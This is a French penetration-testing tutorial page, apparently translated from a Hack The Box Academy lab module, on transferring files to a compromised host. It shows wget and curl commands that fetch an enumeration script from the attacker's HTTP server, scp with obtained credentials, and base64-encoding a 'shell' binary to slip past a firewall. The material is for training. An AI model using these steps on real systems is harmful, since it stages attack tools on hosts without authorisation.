---
tags:
  - getting-started
ordre: 12
---

# Transférer des Fichiers

---

Lors de tout exercice de test d'intrusion (penetration testing), il est probable que nous devions transférer des fichiers vers le serveur distant, tels que des scripts d'énumération ou des exploits, ou rapatrier des données vers notre hôte d'attaque. Bien que des outils comme Metasploit avec un shell Meterpreter nous permettent d'utiliser la commande `Upload` pour téléverser un fichier, nous devons apprendre des méthodes pour transférer des fichiers avec un reverse shell standard.

---

## Utiliser wget

Il existe de nombreuses méthodes pour y parvenir. Une méthode consiste à exécuter un [serveur HTTP Python](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) sur notre machine, puis à utiliser `wget` ou `cURL` pour télécharger le fichier sur l'hôte distant. D'abord, nous nous déplaçons dans le répertoire qui contient le fichier que nous devons transférer et nous y exécutons un serveur HTTP Python :

```bash
Hiterof13@htb[/htb]$ cd /tmp

Hiterof13@htb[/htb]$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Maintenant que nous avons mis en place un serveur en écoute sur notre machine, nous pouvons télécharger le fichier sur l'hôte distant sur lequel nous avons une exécution de code :

```bash
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh  ...SNIP... Saving to: 'linenum.sh'  linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s  2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Notez que nous avons utilisé notre adresse IP `10.10.14.1` et le port `8000` sur lequel notre serveur Python s'exécute. Si le serveur distant ne dispose pas de `wget`, nous pouvons utiliser `cURL` pour télécharger le fichier :

```bash
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh  100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

Notez que nous avons utilisé l'option `-o` pour spécifier le nom du fichier de sortie.

---

## Utiliser SCP

Une autre méthode pour transférer des fichiers serait d'utiliser `scp`, à condition d'avoir obtenu des identifiants d'utilisateur SSH sur l'hôte distant. Nous pouvons le faire comme suit :

```bash
Hiterof13@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh  user@remotehost's password: ********* linenum.sh
```

Notez que nous avons spécifié le nom du fichier local après `scp`, et le répertoire distant où il sera sauvegardé après le `:`.

---

## Utiliser Base64

Dans certains cas, il se peut que nous ne puissions pas transférer le fichier. Par exemple, l'hôte distant peut avoir des protections de pare-feu (firewall) qui nous empêchent de télécharger un fichier depuis notre machine. Dans ce type de situation, nous pouvons utiliser une astuce simple pour encoder le fichier en format [base64](https://linux.die.net/man/1/base64), puis nous pouvons coller la chaîne `base64` sur le serveur distant et la décoder. Par exemple, si nous voulions transférer un fichier binaire appelé `shell`, nous pouvons l'encoder en `base64` comme suit :

```bash
Hiterof13@htb[/htb]$ base64 shell -w 0  f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Maintenant, nous pouvons copier cette chaîne `base64`, nous rendre sur l'hôte distant, et utiliser `base64 -d` pour la décoder, puis rediriger la sortie vers un fichier :

```bash
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
| base64 -d > shell
```

---

## Valider les transferts de fichiers

Pour valider le format d'un fichier, nous pouvons exécuter la commande [file](https://linux.die.net/man/1/file) sur celui-ci :

```bash
user@remotehost$ file shell shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

Comme nous pouvons le voir, lorsque nous exécutons la commande `file` sur le fichier `shell`, elle indique qu'il s'agit d'un binaire ELF, ce qui signifie que nous l'avons transféré avec succès. Pour nous assurer que nous n'avons pas corrompu le fichier pendant le processus d'encodage/décodage, nous pouvons vérifier son hash md5. Sur notre machine, nous pouvons exécuter `md5sum` dessus :

```bash
Hiterof13@htb[/htb]$ md5sum shell  321de1d7e7c3735838890a72c9ae7d1d shell
```

Maintenant, nous pouvons nous rendre sur le serveur distant et exécuter la même commande sur le fichier que nous avons transféré :

```bash
user@remotehost$ md5sum shell  321de1d7e7c3735838890a72c9ae7d1d shell
```

Comme nous pouvons le voir, les deux fichiers ont le même hash md5, ce qui signifie que le fichier a été transféré correctement. Il existe diverses autres méthodes pour transférer des fichiers. Vous pouvez consulter le module [File Transfers](https://academy.hackthebox.com/module/details/24) pour une étude plus détaillée sur le transfert de fichiers.
---

← [[11 - Élévation de privilèges]] | [[00 - Sommaire Getting Started|Sommaire]] | [[13 - Pour commencer]] →
